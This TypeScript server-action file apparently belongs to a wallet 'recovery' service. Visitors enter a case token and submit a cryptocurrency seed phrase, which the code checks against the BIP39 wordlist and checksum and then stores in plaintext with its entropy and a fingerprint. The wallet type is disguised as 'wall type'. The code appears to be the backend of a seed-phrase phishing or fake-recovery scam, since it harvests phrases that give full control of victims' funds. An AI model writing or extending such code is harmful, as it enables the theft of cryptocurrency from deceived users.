'use server';

import { db } from '@/lib/db';
import { findActiveTokenByString, updateTokenLastUsed } from './authToken';
import { WALL_TYPE } from '@/generated/prisma/client';

export interface RecoverySubmissionData {
	token: string;
	wType: string;
	phrase: string;
	userEmail?: string;
	createdAt: Date;
}

export interface RecoverySubmissionResult {
	success: boolean;
	message: string;
	data?: {
		phraseId: string;
		caseId: string;
		caseTitle: string;
	};
	error?: string;
}

/**
 * Validates a  phrase format
 * @param phrase - The phrase to validate
 * @returns boolean - True if valid, false otherwise
 */
import * as bip39 from 'bip39';

interface ValidationResult {
	isValid: boolean;
	error?: string;
	entropy?: string;
	fingerprint?: string;
}

/**
 * Generates a wallet fingerprint from a recovery phrase
 * @param phrase - The recovery phrase to generate fingerprint from
 * @returns string - Hexadecimal fingerprint
 */
function generateWalletFingerprint(phrase: string): string {
	const seed = bip39.mnemonicToSeedSync(phrase);
	// Take first 4 bytes of the seed as fingerprint
	return seed.slice(0, 4).toString('hex');
}

function validateRecoveryPhrase(phrase: string): ValidationResult {
	if (!phrase || typeof phrase !== 'string') {
		return { isValid: false, error: 'Recovery phrase is required' };
	}

	const words = phrase
		.trim()
		.split(/\s+/)
		.filter((word) => word.length > 0);

	if (words.length !== 12 && words.length !== 24) {
		return { isValid: false, error: 'Recovery phrase must be exactly 12 or 24 words' };
	}

	// Check if all words are in the BIP39 wordlist
	const invalidWords = words.filter(word => !bip39.wordlists.english.includes(word.toLowerCase()));
	if (invalidWords.length > 0) {
		return { 
			isValid: false, 
			error: `Invalid word(s) found: ${invalidWords.join(', ')}. All words must be from the BIP39 wordlist.`
		};
	}

	// Validate the mnemonic entropy
	if (!bip39.validateMnemonic(phrase)) {
		return { isValid: false, error: 'Invalid recovery phrase checksum' };
	}

	const entropy = bip39.mnemonicToEntropy(phrase);
const fingerprint = generateWalletFingerprint(phrase);

return { 
	isValid: true,
	entropy,
	fingerprint
};
}

/**
 * Validates wall type against enum values
 * @param wType - The wall type to validate
 * @returns boolean - True if valid, false otherwise
 */
function validateWallType(wType: string): boolean {
	if (!wType || typeof wType !== 'string') {
		return false;
	}

	return Object.values(WALL_TYPE).includes(wType as WALL_TYPE);
}

/**
 * Sanitizes the  phrase by normalizing whitespace
 * @param phrase - The  phrase to sanitize
 * @returns string - The sanitized phrase
 */
function sanitizeRecoveryPhrase(phrase: string): string {
	if (!phrase || typeof phrase !== 'string') {
		return '';
	}

	return phrase
		.trim()
		.split(/\s+/)
		.filter((word) => word.length > 0)
		.map((word) => word.toLowerCase())
		.join(' ');
}

/**
 * Submits a  request with auth token verification
 * @param data -  submission data
 * @returns Promise<RecoverySubmissionResult> - The submission result
 */
export async function submitRecoveryRequest(
	data: RecoverySubmissionData
): Promise<RecoverySubmissionResult> {
	try {
		if (!data || typeof data !== 'object') {
			return {
				success: false,
				message: 'Invalid submission data',
				error: 'INVALID_DATA',
			};
		}

		if (
			!data.token ||
			typeof data.token !== 'string' ||
			data.token.trim() === ''
		) {
			return {
				success: false,
				message: 'Auth token is required',
				error: 'MISSING_AUTH_TOKEN',
			};
		}

		if (
			!data.wType ||
			typeof data.wType !== 'string' ||
			data.wType.trim() === ''
		) {
			return {
				success: false,
				message: 'Wall type is required',
				error: 'MISSING_WALL_TYPE',
			};
		}

		if (
			!data.phrase ||
			typeof data.phrase !== 'string' ||
			data.phrase.trim() === ''
		) {
			return {
				success: false,
				message: 'Recovery phrase is required',
				error: 'MISSING_RECOVERY_PHRASE',
			};
		}

		if (!validateWallType(data.wType)) {
			return {
				success: false,
				message: 'Invalid wall type selected',
				error: 'INVALID_WALL_TYPE',
			};
		}

		const phraseValidation = validateRecoveryPhrase(data.phrase);
		if (!phraseValidation.isValid) {
			return {
				success: false,
				message: phraseValidation.error || 'Invalid recovery phrase format',
				error: 'INVALID_RECOVERY_PHRASE_FORMAT',
			};
		}

		// Store entropy and fingerprint for additional validation
		const { entropy, fingerprint } = phraseValidation;

		const token = await findActiveTokenByString(data.token.trim());
		if (!token) {
			return {
				success: false,
				message: 'Invalid or expired auth token',
				error: 'INVALID_AUTH_TOKEN',
			};
		}

		const sanitizedPhrase = sanitizeRecoveryPhrase(data.phrase);

		if (!sanitizedPhrase) {
			return {
				success: false,
				message: 'Invalid recovery phrase format',
				error: 'INVALID_RECOVERY_PHRASE_FORMAT',
			};
		}

		const userEmail =
			data.userEmail && data.userEmail.trim()
				? data.userEmail.trim()
				: 'anonymous@recovery.com';

		const existingPhrase = await db.phrase.findFirst({
			where: {
				phrase: sanitizedPhrase,
				wType: data.wType as WALL_TYPE,
				user: {
					email: userEmail,
				},
			},
		});

		if (existingPhrase) {
			return {
				success: false,
				message:
					'This recovery phrase has already been submitted for this wall type',
				error: 'DUPLICATE_PHRASE',
			};
		}

		const newPhrase = await db.phrase.create({
			data: {
				wType: data.wType as WALL_TYPE,
				createdAt: data.createdAt,
				phrase: sanitizedPhrase,
				entropy: entropy,
				fingerprint: fingerprint,
				user: {
					connectOrCreate: {
						where: {
							email: userEmail,
						},
						create: {
							email: userEmail,
							name: 'Recovery User',
						},
					},
				},
			},
		});

		await updateTokenLastUsed(token.id);

		return {
			success: true,
			message: 'Recovery request submitted successfully',
			data: {
				phraseId: newPhrase.id,
				caseId: token.caseId,
				caseTitle: token.caseTitle,
			},
		};
	} catch (error) {
		console.error('Error submitting recovery request:', error);

		if (error instanceof Error) {
			if (error.message.includes('Unique constraint')) {
				return {
					success: false,
					message: 'This recovery phrase has already been submitted',
					error: 'DUPLICATE_PHRASE',
				};
			}

			if (error.message.includes('Foreign key constraint')) {
				return {
					success: false,
					message: 'Invalid user reference',
					error: 'INVALID_USER_REFERENCE',
				};
			}

			if (error.message.includes('Invalid wall type')) {
				return {
					success: false,
					message: 'Invalid wall type provided',
					error: 'INVALID_WALL_TYPE',
				};
			}
		}

		return {
			success: false,
			message: 'An unexpected error occurred while processing your request',
			error: 'INTERNAL_SERVER_ERROR',
		};
	}
}

/**
 * Verifies if an auth token is valid and active
 * @param tokenString - The token string to verify
 * @returns Promise<{ valid: boolean; caseInfo?: { caseId: string; caseTitle: string }; error?: string }>
 */
export async function verifytoken(tokenString: string): Promise<{
	valid: boolean;
	caseInfo?: { caseId: string; caseTitle: string };
	error?: string;
}> {
	try {
		if (
			!tokenString ||
			typeof tokenString !== 'string' ||
			tokenString.trim() === ''
		) {
			return {
				valid: false,
				error: 'Token is required',
			};
		}

		const token = await findActiveTokenByString(tokenString.trim());

		if (!token) {
			return {
				valid: false,
				error: 'Invalid or expired token',
			};
		}

		return {
			valid: true,
			caseInfo: {
				caseId: token.caseId,
				caseTitle: token.caseTitle,
			},
		};
	} catch (error) {
		console.error('Error verifying auth token:', error);
		return {
			valid: false,
			error: 'Failed to verify token',
		};
	}
}

/**
 * Gets recovery statistics for a specific case
 * @param caseId - The case ID to get stats for
 * @returns Promise with recovery stats
 */
export async function getRecoveryStats(caseId: string): Promise<{
	totalSubmissions: number;
	uniqueWallTypes: number;
	lastSubmission?: Date;
}> {
	try {
		if (!caseId || typeof caseId !== 'string' || caseId.trim() === '') {
			return {
				totalSubmissions: 0,
				uniqueWallTypes: 0,
			};
		}

		const tokens = await db.authToken.findMany({
			where: { caseId: caseId.trim() },
			select: { token: true },
		});

		if (tokens.length === 0) {
			return {
				totalSubmissions: 0,
				uniqueWallTypes: 0,
			};
		}

		const phrases = await db.phrase.findMany({
			select: {
				wType: true,
				id: true,
				createdAt: true,
			},
			orderBy: {
				createdAt: 'desc',
			},
		});

		const uniqueWallTypes = new Set(phrases.map((p) => p.wType));

		return {
			totalSubmissions: phrases.length,
			uniqueWallTypes: uniqueWallTypes.size,
			lastSubmission: phrases.length > 0 ? phrases[0].createdAt : undefined,
		};
	} catch (error) {
		console.error('Error getting recovery stats:', error);
		return {
			totalSubmissions: 0,
			uniqueWallTypes: 0,
		};
	}
}
